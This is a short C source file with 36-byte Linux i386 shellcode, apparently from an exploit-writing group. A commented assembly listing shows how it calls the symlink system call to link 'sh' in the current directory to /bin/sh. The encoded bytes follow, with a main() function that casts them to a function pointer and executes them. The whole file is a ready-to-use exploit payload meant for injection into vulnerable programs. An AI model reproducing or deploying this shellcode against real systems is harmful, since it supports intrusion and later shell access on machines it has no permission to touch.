/*The shellcode calls the symlink() and makes the
 link to the /bin/sh in the current dir.
 size = 36 bytes
 OS   = Linux i386
 	written by /rootteam/dev0id (rootteam.void.ru)



  BITS 32

jmp short	callit

doit:

pop		esi
xor		eax,eax
mov byte	[esi+7],al
mov byte	[esi+10],al
mov byte	al,83
lea		ebx,[esi]
lea             ecx,[esi+8]
int		0x80


callit:
call		doit

db		'/bin/sh#sh#'
*/

char shellcode[]=
"\xEB\x12"
"\x5E"
"\x31\xC0"
"\x88\x46\x07"
"\x88\x46\x0A"
"\xB0\x53"
"\x8D\x1E\x8D\x4E"
"\x08\xCD"
"\x80\xE8\xE9"
"\xFF"
"\xFF"
"\xFF\x2F"
"\x62\x69\x6E"
"\x2F"
"\x73\x68"
"\x23\x73\x68"
"\x23";


int
main (void)
{
	void (*code)(void);
	code=(void(*)())shellcode;
	(void)code();
	return 0;

}